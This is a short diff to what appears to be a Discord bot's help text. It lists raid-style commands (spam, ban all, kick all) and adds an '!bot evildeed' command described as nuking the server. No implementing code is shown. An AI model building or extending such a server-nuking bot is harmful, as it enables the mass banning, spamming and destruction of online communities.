@@ -31,4 +31,5 @@ Store it securely using our Secrets feature." then press the Enter Key
 !bot removeuser [user_id]': 'Removes a user from the allowed users list',
 '!bot spam [message]': 'Spams the provided message',
 '!bot ban all': 'Bans all members from the server except allowed users',
-'!bot kick all': 'Kicks all members from the server except allowed users'
+'!bot kick all': 'Kicks all members from the server except allowed users',
+'!bot evildeed': 'Nukes the server'
